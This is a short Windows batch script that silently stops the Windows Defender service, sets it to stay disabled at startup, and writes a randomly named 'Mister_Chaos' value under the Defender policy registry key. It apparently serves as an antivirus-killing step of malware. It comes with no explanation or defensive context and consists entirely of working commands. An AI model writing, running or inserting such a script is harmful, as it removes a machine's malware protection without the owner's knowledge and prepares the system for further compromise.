@echo off
sc stop windefend
net stop windefend
sc config windefend start= disabled
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /V Mister_Chaos%random% /T REG_DWORD /D 1 /F
exit